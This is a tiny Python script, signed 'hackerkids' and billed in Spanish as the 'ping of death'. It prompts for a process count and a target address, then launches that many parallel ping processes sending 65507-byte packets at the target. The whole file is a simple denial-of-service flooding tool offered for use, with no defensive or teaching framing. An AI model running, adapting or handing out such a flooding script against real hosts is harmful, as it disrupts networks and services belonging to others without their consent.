# el eterno y querido ping de la muerte by hackerkids


import os
import subprocess

print("PROCESOS: ", end="")
data=int(input())
print("TARGETS: ", end="")
targets=str(input(""))
for i in range(data):
    print(subprocess.Popen(["ping","-D","-s 65507",targets]))

print("END.")
